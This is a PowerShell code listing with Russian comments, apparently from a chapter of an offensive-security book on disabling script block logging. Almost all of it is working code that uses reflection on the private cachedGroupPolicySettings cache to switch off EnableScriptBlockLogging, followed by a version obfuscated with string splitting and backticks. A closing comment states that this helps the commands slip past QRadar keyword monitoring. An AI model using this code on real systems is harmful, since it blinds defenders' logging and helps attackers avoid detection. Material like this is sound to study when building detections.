### Глава 8 ###
# Кастрируем блок сценария регистрации

[console]
[Console]::WriteLine("static method WriteLine")

[System.Management.Automation.PSReference].Assembly

[ref].Assembly
$utils = [ref].Assembly.GetType('System.Management.Automation.Utils')
$utils

$dict = $utils.GetField("cachedGroupPolicySettings","NonPublic,Static")
$dict

$dict.getValue("")

# Value is null
[ScriptBlock].GetField('signatures','NonPublic,Static').GetValue($null)

# Создаём новый объект словаря
$val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()

# Наполняем свой словарь
$val.Add('EnableScriptB'+'lockLogging', 0)
$val.Add('EnableScriptB'+'lockInvocationLogging', 0)
$GPS['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $val

$key = "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
$scriptBlockLogging = $dict.getValue("")[$key]
$scriptBlockLogging['EnableScriptBlockLogging'] = 0

# Obfuscation
$utils = [ref].Assembly.GetType('System.Management.Automation.Utils')

$dict = $utils.("Ge"+"t`F`ield")('cachedGroupPolicySettings', 'NonP'+'ublic,Static')
$key = "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBl"+"ockLogging"
$dict.getValue("")[$key]['EnableS'+'criptBlockLogging'] = 0

# Когда мы исполняем эти команды в своей лаборатории проверок, они все, как и ожидалось, регистрируются, 
# но все они относятся к категории Verbose вместо того, чтобы помечаться как полноценное Warning (Рисунок 8.4) и, 
# таким образом, тонут среди тысяч прочих бессмысленных сообщений Verbose. Более того, применённые нами методы 
# затруднения анализа, скорее всего, позволят обойти любой выполняемый QRadar мониторинг ключевых слов.

